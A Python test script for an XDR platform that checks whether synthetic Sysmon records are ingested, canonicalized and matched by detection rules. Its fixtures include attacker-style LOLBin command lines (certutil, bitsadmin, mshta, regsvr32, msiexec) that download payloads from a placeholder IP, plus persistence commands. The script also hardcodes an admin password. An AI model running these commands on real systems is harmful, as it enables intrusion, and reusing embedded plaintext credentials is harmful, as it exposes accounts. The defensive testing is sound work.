#!/usr/bin/env python3
"""Gate W1 (host-independent half) · Windows/Sysmon evidence preservation.

**REPLAY/SYNTHETIC PROVEN — NOT REAL-SOURCE PROVEN.**
Every Sysmon record below is a synthetic record in Microsoft's documented
EventData shape, delivered over the authenticated ingest route. That proves
the parser, the canonicalization, the field provenance, the rule binding and
the negative controls. It does **not** prove that genuine Windows telemetry
reaches this platform: no Windows host is reachable from this environment, so
W1's real-source acceptance is **REAL_SOURCE_BLOCKED** and W1 is NOT closed.

The Windows execution content stays product-gated on purpose: flipping
`_COLLECTED_PRODUCTS` is the live-source acceptance step, not this one. Where
this script reports what WOULD bind, it is labelled PROJECTION.
"""
from __future__ import annotations

import json
import os
import sys
import time
import urllib.error
import urllib.request

sys.path.insert(0, "/app/backend")

from dotenv import load_dotenv                                  # noqa: E402

load_dotenv("/app/backend/.env")
load_dotenv("/app/frontend/.env")

BASE = os.environ["REACT_APP_BACKEND_URL"].rstrip("/")
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/126.0"
STAMP = int(time.time())
TEN = "default"
OTHER = f"w1-other-{STAMP}"
ADMIN = ("admin@nivxray.com", "uulVDp5cCSB3Hva99s7UUAwK")
PROOF_SOURCE = f"w1-proof-{STAMP}"
HOST = f"WS-W1-{STAMP}"
SHA256 = f"{STAMP:x}".rjust(64, "e")[:64]
ok = True

# rule upstream_id → (EventData for a record exhibiting the behaviour)
EXEC_CASES = {
    "proc_creation_win_susp_encoded_pshell": {
        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAG4AZQB3AC0A"},
    "proc_creation_win_regsvr32_squiblydoo": {
        "Image": "C:\\Windows\\System32\\regsvr32.exe",
        "CommandLine": "regsvr32.exe /s /u /i:http://198.51.100.7/a.sct scrobj.dll"},
    "proc_creation_win_mshta_remote_hta": {
        "Image": "C:\\Windows\\System32\\mshta.exe",
        "CommandLine": "mshta.exe http://198.51.100.7/a.hta"},
    "proc_creation_win_rundll32_user_writable": {
        "Image": "C:\\Windows\\System32\\rundll32.exe",
        "CommandLine": "rundll32.exe C:\\Users\\Public\\a.dll,Start"},
    "proc_creation_win_certutil_urlcache": {
        "Image": "C:\\Windows\\System32\\certutil.exe",
        "CommandLine": "certutil.exe -urlcache -split -f http://198.51.100.7/p.exe"},
    "proc_creation_win_bitsadmin_download": {
        "Image": "C:\\Windows\\System32\\bitsadmin.exe",
        "CommandLine": "bitsadmin.exe /transfer j http://198.51.100.7/p.exe C:\\Users\\Public\\p.exe"},
    "proc_creation_win_wmic_process_call": {
        "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
        "CommandLine": "wmic.exe /node:WS-02 process call create \"cmd /c p.exe\""},
    "proc_creation_win_schtasks_persistence": {
        "Image": "C:\\Windows\\System32\\schtasks.exe",
        "CommandLine": "schtasks.exe /create /tn Updater /tr C:\\Users\\Public\\p.exe /sc onlogon"},
    "proc_creation_win_msiexec_remote": {
        "Image": "C:\\Windows\\System32\\msiexec.exe",
        "CommandLine": "msiexec.exe /q /i https://198.51.100.7/a.msi"},
    "proc_creation_win_office_spawns_shell": {
        "Image": "C:\\Windows\\System32\\cmd.exe",
        "CommandLine": "cmd.exe /c whoami",
        "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        "ParentCommandLine": "WINWORD.EXE /n C:\\Users\\alice\\invoice.docm"},
    "behavior_lolbin_from_office": {
        "Image": "C:\\Windows\\System32\\certutil.exe",
        "CommandLine": "certutil.exe -decode C:\\Users\\Public\\a.b64 C:\\Users\\Public\\a.exe",
        "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
        "ParentCommandLine": "EXCEL.EXE /dde book.xlsm"},
    "win_persistence_registry_run_key": {
        "event_id": 13, "EventType": "SetValue",
        "TargetObject": ("HKU\\S-1-5-21-1\\Software\\Microsoft\\Windows\\"
                         "CurrentVersion\\Run\\Updater"),
        "Details": "C:\\Users\\Public\\p.exe",
        "Image": "C:\\Windows\\regedit.exe"},
}
BENIGN = {"Image": "C:\\Windows\\System32\\notepad.exe",
          "CommandLine": "notepad.exe C:\\Users\\alice\\notes.txt",
          "ParentImage": "C:\\Windows\\explorer.exe",
          "ParentCommandLine": "explorer.exe"}


def check(label, cond, detail=""):
    global ok
    ok = ok and bool(cond)
    print(f"  [{'PASS' if cond else 'FAIL'}] {label}"
          + (f" — {detail}" if detail else ""))


def call(path, method="GET", token=None, key=None, tenant=None, body=None):
    h = {"User-Agent": UA, "Content-Type": "application/json"}
    if token:
        h["Authorization"] = f"Bearer {token}"
    if key:
        h["X-XDR-API-Key"] = key
    if tenant:
        h["X-Tenant-Id"] = tenant
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(BASE + path, data=data, headers=h,
                               method=method)
    try:
        with urllib.request.urlopen(r, timeout=120) as resp:
            return resp.status, json.loads(resp.read() or b"{}")
    except urllib.error.HTTPError as e:
        raw = e.read().decode()[:400]
        try:
            return e.code, json.loads(raw)
        except Exception:                                       # noqa: BLE001
            return e.code, raw


def sysmon(sei, over, guid_suffix="a"):
    ev = {"event_id": 1, "provider": "Microsoft-Windows-Sysmon",
          "Computer": HOST, "User": "CORP\\alice",
          "ProcessId": "4711", "ProcessGuid": f"{{w1-{STAMP}-{guid_suffix}}}",
          "ParentImage": "C:\\Windows\\explorer.exe",
          "ParentCommandLine": "explorer.exe",
          "ParentProcessId": "500",
          "ParentProcessGuid": f"{{w1-{STAMP}-p}}",
          "UtcTime": "2026-06-01T10:00:00Z", "channel":
          "Microsoft-Windows-Sysmon/Operational"}
    ev.update(over)
    return {"tenant_id": TEN, "collector_id": COL, "source_event_id": sei,
            "collection_method": "wef", "source": "w1-proof",
            "declared_source": "microsoft-sysmon", "raw": ev}


COL = None


def main():
    global COL
    from detection_content import ioc_watchlist as iw
    from detection_content import rule_store_binding as rsb
    from detection_content.nivxray_native_sigma import evaluate as nx
    from pymongo import MongoClient

    print(f"== W1 (HOST-INDEPENDENT HALF) · {BASE} ==")
    print("   EVIDENCE CLASS: REPLAY/SYNTHETIC — real-source acceptance is "
          "REAL_SOURCE_BLOCKED\n")
    _, body = call("/api/auth/login", "POST",
                   body={"email": ADMIN[0], "password": ADMIN[1]})
    token = body.get("access_token")
    check("admin session", bool(token))
    if not token:
        return 1
    _, body = call("/api/xdr/collectors", "POST", token=token, tenant=TEN,
                   body={"name": f"w1-collector-{STAMP}", "protocol": "wef",
                         "authorized_sources": ["microsoft-sysmon"]})
    COL = (body.get("data") or {}).get("id")
    _, body = call("/api/xdr/api-keys", "POST", token=token, tenant=TEN,
                   body={"name": f"w1-key-{STAMP}", "confirm_tenant_id": TEN,
                         "allow_new_tenant": False,
                         "scopes": ["collectors.enroll", "collectors.read"]})
    d = body.get("data") or {}
    key = d.get("plaintext") or d.get("api_key")
    check("collector + ingest key", bool(COL and key))
    if not (COL and key):
        return 1

    db = MongoClient(os.environ["MONGO_URL"])[
        os.environ.get("DB_NAME") or "test_database"]
    canon = db["xdr_canonical_evidence"]
    iocs = db[iw.WATCHLIST_COLLECTION]

    print("== 0 · REAL-SOURCE AVAILABILITY ==")
    windows_collectors = list(db["xdr_collectors"].find(
        {"authorized_sources": "microsoft-sysmon",
         "last_seen_at": {"$ne": None}}, {"_id": 0, "id": 1}))
    real = canon.count_documents({
        "source_product": "Sysmon",
        "provenance.collector_id": {"$nin": [None, "", "v2_ingestion.seed_golden"]},
        "raw_ref.channel": "Microsoft-Windows-Sysmon/Operational",
        "host.hostname": {"$not": {"$regex": "^(WS-|WKS-)"}}})
    print(f"    enrolled Windows collectors with a heartbeat: "
          f"{len(windows_collectors)}")
    print(f"    canonical Sysmon records from a non-proof host: {real}")
    check("no genuine Windows source is claimed — REAL_SOURCE_BLOCKED is "
          "reported honestly", len(windows_collectors) == 0)

    print("\n== 1 · REAL INGEST OF SYSMON-SHAPED EVIDENCE ==")
    envelopes = [sysmon(f"w1:{STAMP}:{rid}", over, rid[:6])
                 for rid, over in EXEC_CASES.items()]
    envelopes.append(sysmon(f"w1:{STAMP}:benign", BENIGN, "ben"))
    envelopes.append(sysmon(f"w1:{STAMP}:rename", {
        "Image": "C:\\Users\\Public\\svchost.exe",
        "OriginalFileName": "PowerShell.EXE",
        "CommandLine": "svchost.exe -NoP -W hidden",
        "Hashes": f"MD5=badmd5,SHA256={SHA256}"}, "ren"))
    envelopes.append(sysmon(f"w1:{STAMP}:file", {
        "event_id": 11, "TargetFilename": "C:\\Users\\Public\\payload.exe",
        "Image": "C:\\Windows\\System32\\certutil.exe"}, "fil"))
    code, body = call("/api/xdr/ingest/telemetry", "POST", key=key,
                      tenant=TEN, body={"envelopes": envelopes})
    data = body.get("data") or body
    check(f"{len(envelopes)} Sysmon records accepted through the real route",
          code == 200 and data.get("accepted") == len(envelopes),
          f"{code} accepted={data.get('accepted')}")

    def ev(**q):
        d = canon.find_one({"tenant_id": TEN, "host.hostname": HOST, **q})
        if d:
            d.pop("_id", None)
        return d

    records = {}
    for rid, over in EXEC_CASES.items():
        q = ({"registry.value_name": "Updater"} if over.get("event_id") == 13
             else {"process.command_line": over["CommandLine"]})
        records[rid] = ev(**q)
    benign = ev(**{"process.command_line": BENIGN["CommandLine"]})
    renamed = ev(**{"process.original_file_name": "PowerShell.EXE"})
    filerec = ev(**{"file.path": "C:\\Users\\Public\\payload.exe"})
    missing = [k for k, v in records.items() if not v]
    check("every behaviour produced canonical evidence",
          not missing and benign and renamed and filerec,
          ", ".join(missing) or "all present")
    if missing or not (benign and renamed and filerec):
        iocs.delete_many({"source": PROOF_SOURCE})
        return 1

    print("\n== 2 · FIELDS THE DSM USED TO DISCARD ==")
    p = renamed["process"]
    check("Sysmon SHA256 reaches canonical process hash evidence",
          p["hashes"].get("sha256") == SHA256, str(p["hashes"]))
    check("…with field-level provenance naming the wire field",
          p["field_provenance"].get("hashes.sha256", "").startswith(
              "sysmon:EventData.Hashes(SHA256)"))
    check("a malformed digest is REFUSED, not stored",
          "md5" not in p["hashes"]
          and "REFUSED" in p["field_provenance"].get("hashes_rejected", ""),
          str(p["field_provenance"].get("hashes_rejected", ""))[:60])
    office = records["proc_creation_win_office_spawns_shell"]["process"]
    check("ParentImage reaches canonical parent_executable_path",
          office["parent_executable_path"].endswith("WINWORD.EXE"))
    check("ParentCommandLine reaches canonical parent_command_line",
          office["parent_command_line"].startswith("WINWORD.EXE /n"))
    check("…both carry provenance",
          office["field_provenance"].get("parent_executable_path")
          == "sysmon:EventData.ParentImage"
          and office["field_provenance"].get("parent_command_line")
          == "sysmon:EventData.ParentCommandLine")
    check("EID 11 produces canonical FILE evidence with provenance",
          filerec["event_type"] == "file_create"
          and filerec["file"]["name"] == "payload.exe"
          and filerec["file"]["field_provenance"].get("path")
          == "sysmon:EventData.TargetFilename")
    check("…and no hash is invented for a record that carried none",
          filerec["file"]["hashes"] == {})
    reg = records["win_persistence_registry_run_key"]["registry"]
    check("registry evidence is reachable by the Sigma field names",
          rsb.flatten_with_paths(
              records["win_persistence_registry_run_key"])[1].get(
                  "TargetObject") == "registry.target_object",
          reg["target_object"][-30:])

    print("\n== 3 · THE ORIGINALFILENAME INVARIANT ==")
    check("OriginalFileName is preserved as PE metadata",
          p["original_file_name"] == "PowerShell.EXE")
    check("…and is NOT the on-disk name of the renamed binary",
          p["name"] == "svchost.exe"
          and p["original_file_name"] != p["name"],
          f"{p['name']} vs {p['original_file_name']}")
    flat, paths = rsb.flatten_with_paths(renamed)
    check("the Sigma namespace reads the metadata field, not process.name",
          paths.get("OriginalFileName") == "process.original_file_name")
    stripped = json.loads(json.dumps(renamed))
    stripped["process"]["original_file_name"] = ""
    check("an unobserved OriginalFileName is ABSENT, never defaulted",
          "OriginalFileName" not in rsb.flatten_with_paths(stripped)[0])

    print("\n== 4 · WINDOWS EXECUTION CONTENT IS STILL PRODUCT-GATED ==")
    check("_COLLECTED_PRODUCTS was not widened by this gate",
          rsb._COLLECTED_PRODUCTS == {"linux"}, str(rsb._COLLECTED_PRODUCTS))
    rsb.load_bindings(force=True)
    live = {b.upstream_id: b for b in rsb.load_bindings()}
    gated = [rid for rid in EXEC_CASES
             if live.get(rid) and live[rid].state == "NO_TELEMETRY"]
    check("all Windows behaviour rules remain NO_TELEMETRY today",
          len(gated) == len(EXEC_CASES), f"{len(gated)}/{len(EXEC_CASES)}")
    check("…and none of them fires on this evidence",
          all(not rsb.evaluate_store_rules(r) for r in records.values()))

    print("\n== 5 · PROJECTION (what real Windows telemetry would unlock) ==")
    print("    label: PROJECTION — the predicate is evaluated against this "
          "canonical evidence with the product gate lifted IN MEMORY only.")
    import copy as _copy
    from deps import sync_collection
    docs = list(sync_collection(rsb.COLLECTION).find({}, {"_id": 0}))
    saved = set(rsb._COLLECTED_PRODUCTS)
    rsb._COLLECTED_PRODUCTS.add("windows")
    try:
        projected = {}
        for doc in docs:
            b = rsb._Binding(_copy.deepcopy(doc))
            if b.upstream_id in EXEC_CASES or (
                    b.title == "Rundll32 with remote payload"):
                projected.setdefault(b.upstream_id, b)
        rows = []
        for rid, case in EXEC_CASES.items():
            b = projected.get(rid)
            if not b:
                rows.append((rid, "ABSENT", False, False))
                continue
            flat_pos = rsb.flatten_with_paths(records[rid])[0]
            flat_neg = rsb.flatten_with_paths(benign)[0]
            try:
                pos = bool(b.parsed and nx(b.parsed, flat_pos))
                neg = bool(b.parsed and nx(b.parsed, flat_neg))
            except Exception as e:                              # noqa: BLE001
                pos, neg = False, f"ERR {type(e).__name__}"
            rows.append((rid, b.state, pos, neg))
        for rid, state, pos, neg in rows:
            print(f"    {rid:44} {state:12} positive={pos!s:5} "
                  f"benign={neg!s:5}")
        check("every Windows behaviour rule WOULD bind once the product is "
              "collected", all(r[1] == "BOUND" for r in rows),
              str([r[0] for r in rows if r[1] != "BOUND"]))
        check("…and each one matches its behaviour on this canonical "
              "evidence", all(r[2] is True for r in rows),
              str([r[0] for r in rows if r[2] is not True]))
        check("…while none of them matches the benign record",
              all(r[3] is False for r in rows),
              str([r[0] for r in rows if r[3] is not False]))
    finally:
        rsb._COLLECTED_PRODUCTS.clear()
        rsb._COLLECTED_PRODUCTS.update(saved)
        rsb.load_bindings(force=True)
    check("the product gate was restored", rsb._COLLECTED_PRODUCTS
          == {"linux"})

    print("\n== 6 · THE SYSMON HASH REACHES THE IOC PREDICATE ==")
    iocs.insert_one({"kind": "sha256", "value": SHA256,
                     "source": PROOF_SOURCE, "severity": "high",
                     "tags": ["w1-proof"]})
    hits = rsb.evaluate_store_rules(renamed)
    hash_hit = next((h for h in hits
                     if h["upstream_id"] == "ioc_file_hash_watchlist"), None)
    check("a Sysmon-observed SHA256 is matched by the IOC hash predicate",
          hash_hit is not None, str([h["upstream_id"] for h in hits]))
    if hash_hit:
        m = hash_hit["citation"]["matched_conditions"][0]
        check("…citing process.hashes.sha256 and the exact observed value",
              m["canonical_field"] == "process.hashes.sha256"
              and m["observed_value"] == SHA256)
        check("…and the canonical evidence_ref",
              m["evidence_ref"]
              == f"xdr_canonical_evidence/{renamed['event_id']}")
    nohash = json.loads(json.dumps(renamed))
    nohash["process"]["hashes"] = {}
    check("missing hash → no match", not rsb.evaluate_store_rules(nohash))
    wrong = json.loads(json.dumps(renamed))
    wrong["process"]["hashes"] = {"sha256": "f" * 64}
    check("wrong hash → no match", not rsb.evaluate_store_rules(wrong))
    other = json.loads(json.dumps(renamed))
    other["tenant_id"] = OTHER
    check("platform intel still applies to another tenant's own evidence "
          "(and is cited as platform-scoped)",
          any(h["upstream_id"] == "ioc_file_hash_watchlist"
              for h in rsb.evaluate_store_rules(other)))
    iocs.update_one({"kind": "sha256", "value": SHA256,
                     "source": PROOF_SOURCE}, {"$set": {"tenant_id": OTHER}})
    check("…but a tenant-SCOPED entry never judges this tenant",
          not rsb.evaluate_store_rules(renamed))

    print("\n== 7 · MALFORMED AND WRONG-TYPE EVIDENCE ==")
    code, body = call("/api/xdr/ingest/telemetry", "POST", key=key,
                      tenant=TEN, body={"envelopes": [
                          sysmon(f"w1:{STAMP}:malformed",
                                 {"event_id": "not-an-int"}, "mal")]})
    d3 = body.get("data") or body
    check("a malformed Sysmon event is rejected, not canonicalized",
          (d3.get("accepted") or 0) == 0,
          f"accepted={d3.get('accepted')} rejected={d3.get('rejected')}")
    wrong_type = json.loads(json.dumps(filerec))
    check("file evidence does not satisfy a process predicate",
          not rsb.evaluate_store_rules(wrong_type))

    print("\n== 8 · REPLAY / DEDUPE ==")
    before = canon.count_documents({"tenant_id": TEN,
                                    "host.hostname": HOST})
    call("/api/xdr/ingest/telemetry", "POST", key=key, tenant=TEN,
         body={"envelopes": [envelopes[0]]})
    after = canon.count_documents({"tenant_id": TEN, "host.hostname": HOST})
    check("a replayed envelope creates no second canonical record",
          after == before, f"{before} → {after}")

    iocs.delete_many({"source": PROOF_SOURCE})
    check("proof watchlist entry removed", iocs.count_documents(
        {"source": PROOF_SOURCE}) == 0)

    print(f"\n== RESULT: {'PASS' if ok else 'FAIL'} "
          f"(REPLAY/SYNTHETIC) ==")
    print("== W1 REAL-SOURCE ACCEPTANCE: REAL_SOURCE_BLOCKED — "
          "W1 IS NOT CLOSED ==")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
